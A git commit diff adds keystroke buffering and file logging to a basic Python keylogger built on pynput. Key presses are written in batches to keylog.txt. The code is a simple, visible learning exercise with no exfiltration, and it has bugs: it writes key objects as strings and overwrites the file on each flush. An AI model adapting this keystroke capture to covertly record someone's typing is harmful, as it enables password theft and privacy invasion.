791e303a112b34004a8a725406219b6fca5982b0
Syaiful Irfan <syfanx@gmail.com>
2021-05-08 23:56:42 +0800

    create keylog file

--- basic-pykeylogger-ver2.py
+++ basic-pykeylogger-ver2.py
@@ -4,12 +4,26 @@ import pynput
 from pynput.keyboard import Key, Listener  # Listen for key events
 import logging
 
-count = 0
+count = 0   
 keys = []
 
 # Define 'on_press' function
 def on_press(key): 
+    global keys, count
+
+    keys.append(key)
+    count += 1
     print('{0} pressed'.format (key))   # Print (key) character in the {}string
+
+    if count >=10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file (keys):
+    with open("keylog.txt","w") as f:
+        for key in keys:
+            f.write(key)
 
 # Define 'on_release' functon
 def on_release(key): 
